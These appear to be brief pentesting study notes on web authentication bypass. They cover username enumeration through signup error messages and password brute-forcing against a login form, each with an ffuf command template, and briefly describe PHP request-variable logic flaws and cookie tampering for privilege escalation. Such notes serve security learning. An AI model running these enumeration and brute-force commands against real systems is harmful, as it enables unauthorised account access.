# Authentication bypass (Only authorised actions. Do not do illegal stuff.)

## It is usefull to collect a list of valid usernames
- Could be done by getting server error messages
e.g. singup messages that the user already exists
can be exploited with ffuf:

### ffuf
ffuf -w {wordlist} -X POST {type or the request e.g. default is GET} -d {specifies the data we are going to send} "username=FUZZ&email=x&password=x&cpassword=x" -H {specifies additional headers in the request} "Content-Type: application/x-www-form-urlencoded" -u {specifies URL} -mr {the text on the page we are looking for} "username already exists"

### brute-forcing with ffuf
ffuf -w {valid_usernames}:W1,{Common_passwords}:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u {url} -fc 200

## Logic Flaw
The flaw in the logic which may be exploited. E.g. PHP $_request variables that contains data recieved from both query string and POST data. Post data is prioritised. Can be altered with curl

## Cookie Tampering
Changing values of cookies in order to elevate priviliges, get valid usernames, or get anuathorised access. 